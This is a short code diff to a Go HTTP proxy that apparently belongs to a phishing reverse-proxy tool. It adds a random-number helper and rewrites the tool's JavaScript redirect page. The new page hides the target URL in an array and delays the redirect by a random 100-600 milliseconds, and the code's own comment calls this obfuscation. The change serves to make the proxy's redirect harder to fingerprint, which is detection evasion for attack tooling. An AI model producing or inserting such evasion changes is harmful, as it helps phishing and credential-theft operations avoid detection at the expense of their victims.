@@ -20,6 +20,7 @@ import (
 	"html"
 	"io"
 	"io/ioutil"
+	"math/big"
 	"net"
 	"net/http"
 	"net/url"
@@ -1312,8 +1313,34 @@ func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body st
 	return req, nil
 }
 
+func secureRandomInt(min, max int) int {
+	n, err := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
+	if err != nil {
+		return min // Fallback in case of an error
+	}
+	return int(n.Int64()) + min
+}
+
 func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
-	body := fmt.Sprintf("<html><head><meta name='referrer' content='no-referrer'><script>top.location.href='%s';</script></head><body></body></html>", rurl)
+	// Random delay between 100ms and 600ms
+	delay := secureRandomInt(100, 600)
+
+	// Obfuscated JavaScript redirection with delay
+	body := fmt.Sprintf(`
+	<html>
+	<head>
+	    <meta name='referrer' content='no-referrer'>
+	    <script>
+	        var targets = ['%s'];
+	        var target = targets[0];
+	        setTimeout(function() {
+	            window.location.assign(target);
+	        }, %d);
+	    </script>
+	</head>
+	<body></body>
+	</html>`, rurl, delay)
+
 	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 	if resp != nil {
 		return req, resp
